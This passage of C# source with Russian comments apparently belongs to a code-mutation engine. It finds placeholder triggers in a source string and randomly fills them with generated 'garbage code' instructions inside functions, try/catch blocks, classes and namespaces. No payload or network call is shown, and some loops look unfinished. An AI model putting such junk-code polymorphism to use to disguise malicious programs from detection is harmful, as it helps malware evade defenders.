                if ((strnew0.Length - i) >= (int)trigger.TriggerProcedure)
                {
                    SubTemp = strnew0.Substring(i, (int)trigger.TriggerProcedure);
                }

                if (SubTemp == "%$#@additionaltrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (strnew0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerProcedure + Witeration < strnew0.Length)
                        {
                            SubEnd = strnew0.Substring(i + (int)trigger.TriggerProcedure + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerProcedure + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = strnew0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersProcedureTemp)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersProcedureTemp.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionsInProcedureS)(ref str0, ref strnew0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            strnew0 = strnew0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                            //MessageBox.Show(string.Format("Old Trigger= " + TempTrigger)+string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        private static void ModifyAllUniqueTriggersStruct(ref string str0, ref string strnew0)//заполнение триггеров модификации кода процедур
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            List<string> ListTriggersStructTemp = new List<string>();
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < strnew0.Length; i++)
            {
                if ((strnew0.Length - i) >= (int)trigger.TriggerStruct)
                {
                    SubTemp = strnew0.Substring(i, (int)trigger.TriggerStruct);
                }

                if (SubTemp == "%$#@structtrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (strnew0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerStruct + Witeration < strnew0.Length)
                        {
                            SubEnd = strnew0.Substring(i + (int)trigger.TriggerStruct + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerStruct + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = strnew0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersStructTemp)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersStructTemp.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionInStruct)(ref str0, ref strnew0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            strnew0 = strnew0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                            //MessageBox.Show(string.Format("Old Trigger= " + TempTrigger)+string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        private static void ModifyAllUniqueTriggersEnum(ref string str0, ref string strnew0)//заполнение триггеров модификации кода процедур
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            List<string> ListTriggersEnumTemp = new List<string>();
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < strnew0.Length; i++)
            {
                if ((strnew0.Length - i) >= (int)trigger.TriggerEnum)
                {
                    SubTemp = strnew0.Substring(i, (int)trigger.TriggerEnum);
                }

                if (SubTemp == "%$#@enumtrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (strnew0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerEnum + Witeration < strnew0.Length)
                        {
                            SubEnd = strnew0.Substring(i + (int)trigger.TriggerEnum + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerEnum + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = strnew0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersEnumTemp)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersEnumTemp.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionInEnum)(ref str0, ref strnew0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            strnew0 = strnew0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                            //MessageBox.Show(string.Format("Old Trigger= " + TempTrigger)+string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }


        public static void ModifyAllUniqueTriggersTryCatch(ref string str0)//заполнение триггеров модификации кода внутри try catch
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerTryCatch)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerTryCatch);
                }

                if (SubTemp == "%$#@trycatchtrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerTryCatch + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerTryCatch + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerTryCatch + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersTryCatch)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersTryCatch.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                //sHelp = GenerateRandomInstruction(ref InstructionInTryCatch)(ref str0, ref str0);
                                sHelp = GenerateMultiInstructionAlpha(ref InstructionInTryCatch,ref str0, ref str0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                            //MessageBox.Show(string.Format("Old Trigger= " + TempTrigger) + string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        public static void ModifyAllUniqueTriggersBetween(ref string str0)//заполнение триггеров модификации кода между процедурами
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                    if ((str0.Length - i) >= (int)trigger.TriggerBetweenProcedure)
                    {
                        SubTemp = str0.Substring(i, (int)trigger.TriggerBetweenProcedure);
                    }

                    if (SubTemp == "%$#@betweentrigger")//если нашли начало определения триггера между процедурами
                    {
                        SubEnd = "";
                        int Witeration = 0;//итератор цикла while
                        while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                        {
                            if (i + (int)trigger.TriggerBetweenProcedure + Witeration < str0.Length)
                            {
                                SubEnd = str0.Substring(i + (int)trigger.TriggerBetweenProcedure + Witeration, 4);
                                Witeration++;
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                        {
                            TempSizeOfTrigger = (int)trigger.TriggerBetweenProcedure + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                            TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                            bHelper = false;
                            bHelper = true;
                            foreach (string tr in ListTriggersBetween)//определение есть ли уже в листе триггеров такое имя
                            {
                                if (tr == TempTrigger)
                                {
                                    bHelper = false;
                                    break;
                                }
                            }
                            if (bHelper == true)//если имя не повторяется то добавляем его
                            {
                                ListTriggersBetween.Add(TempTrigger);
                                bHelper = Instructions.GenerateRandomBool();
                                if (bHelper == true)
                                {
                                    //sHelp = GenerateRandomInstruction(ref InstructionBetweenProcedure)(ref str0, ref str0);
                                    sHelp = GenerateMultiInstructionAlpha(ref InstructionBetweenProcedure,ref str0, ref str0);
                                }
                                else
                                {
                                    sHelp = " ";
                                }
                                str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                                //MessageBox.Show(sHelp);
                        }
                    }

                    }
            }

        }

        private static void ModifyAllUniqueTriggersBetweenClass(ref string str0)//заполнение триггеров модификации кода между процедурами
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            List<string> ListTriggersBetweenTemp = new List<string>();
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerBetweenProcedure)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerBetweenProcedure);
                }

                if (SubTemp == "%$#@betweentrigger")//если нашли начало определения триггера между процедурами
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerBetweenProcedure + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerBetweenProcedure + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerBetweenProcedure + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersBetweenTemp)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersBetweenTemp.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionBetweenProcedure)(ref str0, ref str0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                                                                    //MessageBox.Show(sHelp);
                        }
                    }

                }
            }

        }

        private static void ModifyAllUniqueTriggersBetweenNamespace(ref string str0)//заполнение триггеров модификации кода внутри пространсва имен
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            List<string> ListTriggersBetweenTemp = new List<string>();
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerClass)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerClass);
                }

                if (SubTemp == "%$#@classtrigger")//если нашли начало определения триггера между процедурами
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerClass + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerClass + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerClass + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersBetweenTemp)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersBetweenTemp.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionClass)(ref str0, ref str0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                                                                    //MessageBox.Show(sHelp);
                        }
                    }

                }
            }

        }

        public static void ModifyAllUniqueTriggersClass(ref string str0)//заполнение триггеров модификации кода между процедурами
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerClass)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerClass);
                }

                if (SubTemp == "%$#@classtrigger")//если нашли начало определения триггера класса
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerClass + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerClass + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerClass + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersClass)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersClass.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionClass)(ref str0, ref str0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                                                                    // MessageBox.Show(string.Format("Old Trigger= " + TempTrigger) + string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }
            }

        }

        public static void ModifyAllUniqueTriggersNamespace(ref string str0)//заполнение триггеров модификации кода пространств имен
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerNamespace)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerNamespace);
                }

                if (SubTemp == "%$#@namespacetrigger")//если нашли начало определения триггера пространства имен
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerNamespace + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerNamespace + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerNamespace + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersNamespace)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersNamespace.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionNamespace)(ref str0, ref str0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                                                                    // MessageBox.Show(string.Format("Old Trigger= " + TempTrigger) + string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }
            }

        }

        public static void GenerateAdditionalTriggersEverywhere(ref string str0)//генерация и заполнение триггеров модификации кода для любого места
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            string sHelp = "";//переменная содержащая инструкцию
            bool bHelper = false;//вспомогательная булевая
            int NamespaceStart = FindFirstNamespace(ref str0);
            bool IsInTryX = false;//находимся ли в блоке try
            bool IsInCatchX = false;//находимся ли в блоке catch
            bool IsInClassExpressionX = false;//находимся ли в определении класса
            bool IsInForX = false;//находимся ли в определении класса
            bool IsNotInIfShortX = false;//ненаходимся ли в коротком блоке if
            int IsInStructX = 0;//находимся ли в структуре

            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= 1)
                {
                    SubTemp = str0.Substring(i, 1);
                }
                IsInTryX = IsInTry(ref str0, ref i);
                IsInCatchX = IsInCatch(ref str0, ref i);
                IsInClassExpressionX = IsInClassExpression(ref str0, ref i);
                IsInStructX = IsInStruct(ref str0, ref i);
                IsInForX = IsInFor(ref str0, ref i);
                IsNotInIfShortX = IsNotInIfShort(ref str0, ref i);
                if (SubTemp == "}" && i > NamespaceStart)//если нашли конец оператора (но он должен быть после namespace)
                {
                    if (IsInClassExpressionX == true)
                    {
                        sHelp = GenerateMultiInstruction(ref InstructionBetweenProcedure, ref str0, ref i);
                        //MessageBox.Show(sHelp);
                    }

                }


                    if (SubTemp == ";" && i > NamespaceStart )//если нашли конец оператора (но он должен быть после namespace)
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while ( SubEnd != ";" && i <= (str0.Length - 1))//поиск следующего оператора
                    {
                        SubEnd = str0.Substring(i + Witeration, 1);
                        Witeration++;
                    }

                    if ( SubEnd == ";" && !FindReturnPrevious(ref str0, ref i) )//если не нашли возврат значения
                    {
                        bHelper = Instructions.GenerateRandomBool();
                        sHelp = "";
                        if ( bHelper == true )
                        {
                            if (IsInClassExpressionX == false )
                            {
                                // этот блок работает
                                if (  IsInStructX == 1 )
                                {
                                    //sHelp = GenerateMultiInstruction(ref InstructionEwerywhere,ref str0,ref i);
                                    //MessageBox.Show(sHelp);
                                }
                                // этот блок работает
                                if (IsInTryX == true || IsInCatchX == true)
                                {
                                    sHelp = GenerateMultiInstruction(ref InstructionInTryCatch,ref str0, ref i);
                                    //MessageBox.Show(sHelp);
                                }

                                // этот блок работает
                                if ( IsInTryX == false && IsInCatchX == false && IsInStructX == 0 && IsInForX == true && IsNotInIfShortX == true )
                                {
                                    sHelp = GenerateMultiInstruction(ref InstructionsInProcedure,ref str0, ref i);
                                    //MessageBox.Show(sHelp);
                                }

                            }
                            else
                            {
                                sHelp = GenerateMultiInstruction(ref InstructionBetweenProcedure,ref str0, ref i);
                            }

                            //MessageBox.Show(string.Format("Old Trigger= " + str0.Substring(i-4, sHelp.Length + 8)) );
                            //str0 = str0.Insert(i+1,(" " + sHelp) );//после того как нашли заменяем триггер на нашу новую инструкцию
                            //i = i+ sHelp.Length+2;
                            //MessageBox.Show(string.Format("  New Trigger= " + str0.Substring(i - 4, sHelp.Length + 8)) );
                        }
                        //MessageBox.Show(string.Format("Old Trigger= " + TempTrigger) + string.Format("  New Trigger= " + sHelp));
                    }

                }

            }

        }


        public static void ReplaceAllUniqueTriggersMeta(ref string str0)//вариация метаописания
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            bool IsInClassExpressionX = false;//
            string sHelp = "";
            int NamespaceStart = FindFirstNamespace(ref str0);

            for (int i = 0; i < str0.Length; i++)//построение иерархии обьектов
            {
                if ((str0.Length - i) >= 1)
                {
                    SubTemp = str0.Substring(i, 1);
                }
                IsInClassExpressionX = IsInNamespaceExpression(ref str0, ref i);
                IsInClassExpressionX = IsInClassExpression(ref str0, ref i);
                if ((SubTemp == "}" || SubTemp == ";") && i > NamespaceStart)//если нашли конец оператора (но он должен быть после namespace)
                {
                    if (IsInClassExpressionX == true)
                    {
                        for (int j = i + 1; j < str0.Length; j++)
                        {
                            SubTemp = str0.Substring(j, 1);
                            if (SubTemp == "{" || SubTemp == "=" || SubTemp == "(" || SubTemp == ";")
                            {
                                TempTrigger = "";
                                for (int k = i + 1; k < j; k++)
                                {
                                    if ((str0.Length - i) >= (int)trigger.TriggerBase)
                                    {
                                        SubTemp = str0.Substring(i, (int)trigger.TriggerBase);
                                    }

                                    if (SubTemp == "%$#@basictrigger")//если нашли начало определения базового триггера
                                    {
                                        SubEnd = "";
                                        int Witeration = 0;//итератор цикла while
                                        while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                                        {
                                            if (i + (int)trigger.TriggerBase + Witeration < str0.Length)
                                            {
                                                SubEnd = str0.Substring(i + (int)trigger.TriggerBase + Witeration, 4);
                                                Witeration++;
                                            }
                                            else
                                            {
                                                break;
                                            }
                                        }
                                        if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                                        {
                                            TempSizeOfTrigger = (int)trigger.TriggerBase + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                                            TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

        }


        private static bool FindReturnPrevious(ref string str0,ref int i0)//предикат возвращающий true в случае если нашлась строчка "return x ;" , где x - любое выражение
        {
            string temptwo="";
            string tempreturns="";
            string tempnewoperator = "";
            int NumC0=0;
            for (int i = i0-2; i >= 0; i--)
            {
                temptwo=str0.Substring(i,2);
                tempnewoperator= str0.Substring(i+1, 1);
                if ( temptwo.Contains(" ") && temptwo != "  ")
                {
                    NumC0++;
                }
                if ( NumC0 >= 1 )
                {
                    if ( i - 5 >= 0 )
                    {
                        tempreturns = str0.Substring(i - 5, 6);
                    }
                    else
                    {
                        tempreturns = "";
                    }
                    if ( tempreturns == "return")
                    {
                        return true;
                    }
                }
                if ( tempnewoperator == ";")
                {
                    return false;
                }
            }
            return false;
        }

        private static int FindFirstNamespace(ref string str0)//найти индекс старта первого определения namespace
        {
            for (int i = 0; i < str0.Length; i++)
            {
                if ( str0.Substring(i, 9) == "namespace" )
